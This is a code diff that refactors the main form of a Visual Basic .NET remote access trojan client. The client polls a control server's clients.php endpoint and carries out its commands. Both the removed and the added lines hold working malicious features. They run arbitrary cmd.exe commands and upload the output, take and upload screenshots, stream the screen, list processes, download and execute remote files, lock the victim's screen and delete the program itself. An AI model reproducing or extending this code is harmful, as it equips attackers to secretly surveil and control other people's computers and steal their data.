@@ -12,8 +12,7 @@ Imports System.Management
 Public Class MainForm
     Private Declare Function GetForegroundWindow Lib "user32" Alias "GetForegroundWindow" () As IntPtr
     Private Declare Auto Function GetWindowText Lib "user32" (ByVal hWnd As System.IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer
-    'Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal Command As String, ByVal ReturnString As String, ByVal ReturnLength As Long, ByVal hWnd As Long) As Long
-    Public Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As UInt32, ByVal hwndCallback As IntPtr) As UInt32
+
     Public mainWebClient As WebClient = New WebClient()
     Public upTime As Integer = 0
     Private Function GetCaption() As String
@@ -64,21 +63,6 @@ Public Class MainForm
         exename = AppDomain.CurrentDomain.FriendlyName
         Return exename
     End Function
-    Public Function ShellRun(sCmd As String) As String
-        Dim oShell As Object = CreateObject("WScript.Shell")
-
-        Dim oExec As Object = oShell.Exec(sCmd)
-        Dim oOutput As Object = oExec.StdOut
-        Dim s As String = ""
-        Dim sLine As String = ""
-
-        While Not oOutput.AtEndOfStream
-            sLine = oOutput.ReadLine
-            If sLine <> "" Then s &= sLine & vbCrLf
-        End While
-
-        Return s
-    End Function
     Public Function APIRequest() As String
         Dim cpuCounter As PerformanceCounter = New PerformanceCounter("Processor", "% Processor Time", "_Total")
         Dim GetCPU As String = String.Format("{0:f0}", Convert.ToSingle(cpuCounter.NextValue()))
@@ -97,16 +81,6 @@ Public Class MainForm
         Return apiResponse
     End Function
 
-    Private Sub loopOpenCD(repeatAmount As Integer)
-        For i = 1 To repeatAmount
-            Try
-                mciSendString("set cdaudio door open", 0, 0, 0)
-                mciSendString("set cdaudio door closed", 0, 0, 0)
-            Catch ex As Exception
-                Exit For
-            End Try
-        Next
-    End Sub
     Private Sub mainBW_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles mainBW.DoWork
         While True
             Dim apiQuery As String = APIRequest()
@@ -147,6 +121,31 @@ Public Class MainForm
     End Sub
 
     Private Sub parseAction(actionType As String, actionContent As String())
+#Region "System"
+
+        ' TODO: Should we put these four on the extractor rather than in the stub ?
+        ' For instance, if persistance is activated then the shutdownrat or rebootrat
+        ' features may not work properly. Same for uninstallrat.
+        If actionType = "shutdownrat" Then
+            SelfRemoval.KillStub()
+
+        ElseIf actionType = "rebootrat" Then
+            SelfRemoval.RebootStub()
+
+        ElseIf actionType = "uninstallrat" Then
+            SelfRemoval.UninstallRAT()
+
+        ElseIf actionType = "userblacklist" Then
+            SelfRemoval.BlacklistClient(actionContent(0))
+
+        ElseIf actionType = "runwincmd" Then
+            WinCMD.Run(actionContent(0), mainWebClient)
+        End If
+
+#End Region
+
+#Region "Surveillance"
+
         If actionType = "camerashot" Then
             ' Dim cap As New Capture() 'first line
             ' cap.Dispose()
@@ -154,91 +153,21 @@ Public Class MainForm
             ' Dim client As New WebClient
             ' client.UploadData(My.Settings.vpsurl & "clients.php?action=uploadscreenshot&actioncontent=test.jpeg", cap.QueryFrame.ToImage)
 
+        ElseIf actionType = "camerashare" Then
+            ' TODO
+
         ElseIf actionType = "screenshare" Then
-            If Screenshare.screenshareBW Is Nothing Then
-                Screenshare.InitFluxManager()
-            End If
-
             If actionContent(0) = "start" Then
-                Screenshare.screenshareQuality = actionContent(1)
-                Screenshare.screenshareFluxInterval = Convert.ToInt32(actionContent(2))
-
-                If Not Screenshare.screenshareBW.IsBusy Then
-                    Screenshare.screenshareBW.RunWorkerAsync()
-                End If
+                Screenshare.SetupFluxManager(Convert.ToInt64(actionContent(1)), Convert.ToInt32(actionContent(2)))
             Else
-                Screenshare.screenshareBW.CancelAsync()
+                Screenshare.StopScreenshare()
             End If
-
 
         ElseIf actionType = "screenshot" Then
-            Dim screenGrab As Bitmap = Screenshare.TakeBitmapScreenshot()
-            Dim bmpBytes As Byte() = Screenshare.ResizeConvertBMP(screenGrab, 75L)
-            mainWebClient.UploadData(My.Settings.vpsurl & "clients.php?action=uploadscreenshot&actioncontent=" + actionContent(0), bmpBytes)
+            IndependantActions.TakeScreenshot(actionContent(0), mainWebClient)
 
-        ElseIf actionType = "runwincmd" Then
-            Dim shellReply As String
-            shellReply = Convert.ToBase64String(Encoding.UTF8.GetBytes(ShellRun("cmd.exe /c " & actionContent(0))))
-            mainWebClient.UploadString(My.Settings.vpsurl, "clients.php?action=sendshellreply&actioncontent=" & shellReply)
-
-        ElseIf actionType = "shutdownrat" Then
-            Environment.Exit(0)
-
-        ElseIf actionType = "rebootrat" Then
-            Process.Start(Application.ExecutablePath)
-            Environment.Exit(0)
-
-        ElseIf actionType = "uninstallrat" Then
-            Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 1 & Del " + Application.ExecutablePath)
-            Environment.Exit(0)
-
-        ElseIf actionType = "openURL" Then
-            Try
-                Process.Start(actionContent(0))
-            Catch ex As System.ComponentModel.Win32Exception
-                Exit Sub
-            End Try
-
-        ElseIf actionType = "msgbox" Then
-            MsgBox(actionContent(0),, "")
-
-        ElseIf actionType = "cdopen" Then
-            Dim mciLoopThread As New Thread(Sub() loopOpenCD(Convert.ToInt32(actionContent(0))))
-            mciLoopThread.Start()
-
-
-        ElseIf actionType = "openremotechat" Then
-            Invoke(Sub() RemoteChat.Show())
-
-        ElseIf actionType = "userblacklist" Then
-            My.Settings.bl = True
-            'TODO: Is the blacklist message really useful ?
-            My.Settings.blmsg = actionContent(0)
-            My.Settings.Save()
-            Environment.Exit(0)
-
-        ElseIf actionType = "closeremotechat" Then
-            Invoke(Sub() RemoteChat.Hide())
-
-
-            'ElseIf actionType = "raisePerm" Then
-            '   Dim raiseperm As New Process()
-            '         New raiseperm() With { .StartInfo = { .FileName = Application.ExecutablePath, .UseShellExecute = True, .Verb = "runas"} }.Start()
-            '        Try
-            '     Process.GetCurrentProcess().Kill()
-            'Catch
-            '    Environment.[Exit](0)
-            'End Try
-
-        ElseIf actionType = "camerashare" Then
-            ' TODO : camera share
-        ElseIf actionType = "lockuser" Then
-            Invoke(Sub() LockedWindow.Show())
-
-        ElseIf actionType = "unlockuser" Then
-            Invoke(Sub() LockedWindow.Hide())
-
-        ElseIf actionType = "getruningtasks" Then
+        ElseIf actionType = "getrunningtasks" Then
+            ' TODO : check this feature
             Dim total As String = ""
             For Each p As Process In Process.GetProcesses
                 total += p.Id & "|"
@@ -247,16 +176,19 @@ Public Class MainForm
                 total += (p.WorkingSet64 / 1024) / 1024 & "[;;]"
             Next
             mainWebClient.DownloadString(My.Settings.vpsurl & "clients.php?action=sendtasks&actioncontent=" & total)
+        End If
 
-        ElseIf actionType = "playmp3" Then
-            ' TODO : check this feature
-            Dim filename As String = actionContent(0)
-            MsgBox(actionContent(0))
-            mainWebClient.DownloadFile(My.Settings.vpsurl & "files/" & filename, filename)
-            File.Move(filename, Path.GetTempPath & filename)
+#End Region
 
+#Region "Tools"
+        If actionType = "openremotechat" Then
+            Invoke(Sub() RemoteChat.Show())
+
+        ElseIf actionType = "closeremotechat" Then
+            Invoke(Sub() RemoteChat.Hide())
 
         ElseIf actionType = "remotexec" Then
+            ' TODO : check this feature
             Dim filename As String = actionContent(0)
             Dim client As New WebClient
             client.DownloadFile(My.Settings.vpsurl & "/files/" & filename, filename)
@@ -266,8 +198,33 @@ Public Class MainForm
             Catch
             End Try
             Process.Start(Path.GetTempPath & filename)
+
+        ElseIf actionType = "lockuser" Then
+            Invoke(Sub() LockedWindow.Show())
+
+        ElseIf actionType = "unlockuser" Then
+            Invoke(Sub() LockedWindow.Hide())
         End If
 
+#End Region
 
+#Region "Fun"
+        If actionType = "openURL" Then
+            IndependantActions.OpenURL(actionContent(0))
+
+        ElseIf actionType = "cdopen" Then
+            UIFeatures.LoopOpenCD(Convert.ToInt32(actionContent(0)))
+
+        ElseIf actionType = "msgbox" Then
+            MsgBox(actionContent(0),, "")
+
+        ElseIf actionType = "playmp3" Then
+            ' TODO : check this feature
+            Dim filename As String = actionContent(0)
+            MsgBox(actionContent(0))
+            mainWebClient.DownloadFile(My.Settings.vpsurl & "files/" & filename, filename)
+            File.Move(filename, Path.GetTempPath & filename)
+        End If
+#End Region
     End Sub
 End Class
